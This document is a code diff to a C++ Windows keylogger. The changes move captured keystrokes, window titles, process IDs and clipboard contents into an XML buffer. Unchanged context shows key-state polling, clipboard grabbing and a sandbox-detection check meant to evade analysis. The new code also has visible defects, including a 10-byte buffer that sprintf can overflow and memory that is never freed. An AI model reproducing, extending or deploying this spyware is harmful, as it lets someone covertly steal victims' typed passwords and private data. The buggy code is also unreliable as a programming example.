@@ -1,6 +1,8 @@
 #include "KeyLogger.h"
-
+#include "Sanitize_KeyLogBuff.h"
+#include <stdio.h>
 char* last_cb_data;
+XML_PROCESS_BUFFER current_process_data;
 using namespace std;
 char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
 const time_t hms = time(0);
@@ -9,6 +11,7 @@ bool gotchar=true;
 
 FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
 {
+    char* temp = (char*)malloc(0x0A);
     /*
         get the total length of the window text length.
     */
@@ -29,9 +32,23 @@ FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
     /*
         print out the xml meta data relevant to the process.
     */
-    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
+
+/*    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
     <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
     <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
+*/    current_process_data = writeUnsanitizedBuffer(current_process_data,"\n\t<Process>\n\t\t<ProcessHandle>");
+    sprintf(temp,"0x%lu",_PROG_HNDL);
+    current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
+    current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessHandle>\n\t\t<ProcessID>");
+    sprintf(temp,"0x%d",GetWindowThreadProcessId(_PROG_HNDL,NULL));
+    current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
+    current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
+    current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE);
+    current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
+    current_process_data = writeUnsanitizedBuffer(current_process_data,TimeStamp);
+    current_process_data = writeUnsanitizedBuffer(current_process_data,
+                                                  "</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");
+
     return 0 ;
 }
 
@@ -67,8 +84,15 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
         /*
             generate the proper xml output for a change of title on a process.
         */
-        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
+  /*      cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
         TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
+  */      current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
+        current_process_data = writeUnsanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE_SECONDARY);
+        current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
+        current_process_data = writeUnsanitizedBuffer(current_process_data,TimeStamp);
+        current_process_data = writeUnsanitizedBuffer(current_process_data,"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");
+
+
     }
 }
 
@@ -113,7 +137,8 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                         determine if the key stroke logged is a special
                         xml character. if so log sanitized character codes
                     */
-                   switch(temp)
+                    current_process_data = writeSanitizedByte(current_process_data,temp);
+/*                   switch(temp)
                    {
                      case '<':  cout << "&lt;"; break;
                      case '>':  cout << "&gt;"; break;
@@ -122,7 +147,7 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                      case '"':  cout << "&quot;"; break;
                      default:  cout << temp; break;
                    }
-                   /*
+*/                   /*
                         set the state for the last key stroke logged, this will
                         allow the program to determine that the keyboard buffer
                         has not yet been flushed.
@@ -152,9 +177,11 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                    char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                    /*
                         determine if the keystroke logged is a special xml character,
-                        if so sshoot out sanitized xml character codes
+                        if so shoot out sanitized xml character codes
                    */
-                   switch(temp)
+                current_process_data = writeSanitizedByte(current_process_data,temp);
+
+ /*                  switch(temp)
                    {
                      case '<':  cout << "&lt;"; break;
                      case '>':  cout << "&gt;"; break;
@@ -163,7 +190,7 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
                      case '"':  cout << "&quot;"; break;
                      default:  cout << temp; break;
                    }
-                   /*
+  */                 /*
                         set the state of the last key stroke logged so
                         this will allow the program to determine that the
                         keyboard buffer has not yet been flushed.
@@ -209,7 +236,8 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
                    /*
                         put the string representing a function key to the string
                    */
-                    cout<<StrOut;
+                    current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
+    //                cout<<StrOut;
                     /*
                         set the state of the last key stroke logged so
                         this will allow the program to determine that the
@@ -236,7 +264,8 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
                    /*
                         put the string representing a function key to the string
                    */
-                    cout<<StrOut;
+                   current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
+ //                   cout<<StrOut;
                     /*
                         set the state of the last key stroke logged so
                         this will allow the program to determine that the
@@ -313,9 +342,16 @@ FORCEINLINE int grabclipboard()
                             print all the necessary meta data for the clipboard
                                 NOTE:L, a sanitizer function for the xml still has to be written.
                         */
-                        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
+/*                        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
                         "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
                         "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
+*/
+                         current_process_data = writeUnsanitizedBuffer(current_process_data,
+                                "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>\n\t\t\t\t<Capture>");
+                         current_process_data = writeSanitizedBuffer(current_process_data,(char*)this_cb_data);
+                         current_process_data = writeUnsanitizedBuffer(current_process_data,
+                                "</Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );
+
                     }
                     /*
                         unlock the clipboard. so that other programs waiting in que to access the
@@ -330,7 +366,18 @@ FORCEINLINE int grabclipboard()
 
 int main()
 {
-
+    /*
+        allocate memory for the buffered data to store he xml tags of each process
+    */
+    current_process_data.buffered_data = (char*)malloc(DefaultBufferSz);
+    /*
+        set the current buffer size so that the total amount of space available is known
+    */
+    current_process_data.buffer_size=DefaultBufferSz;
+    /*
+        no data has been written to the buffer
+    */
+    current_process_data.current_buff_offset=0;
     /*
         execute a check to see if we may be in a sandboxed environment,
         the check relies on the number of processors running on the device
@@ -341,6 +388,8 @@ int main()
         display an xml header to generate the end document.
     */
     cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
+    current_process_data = writeUnsanitizedBuffer(current_process_data,
+    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n");
     /*
         grab a handle to the foreground process.
     */
@@ -428,7 +477,13 @@ int main()
                 complete the xml statements that were previously initialized then
                 initialize a new process xml tag.
             */
-            cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
+ //           cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
+            current_process_data = writeSanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>");
+            current_process_data = writeUnsanitizedByte(current_process_data,(char)0x00);
+                cout<<current_process_data.buffered_data;
+            current_process_data.buffered_data = (char*)realloc(current_process_data.buffered_data,DefaultBufferSz);
+            current_process_data.buffer_size=DefaultBufferSz;
+            current_process_data.current_buff_offset=0;
             /*
                 get the current foreground window and store it in the CURRENTPROCESS.
             */
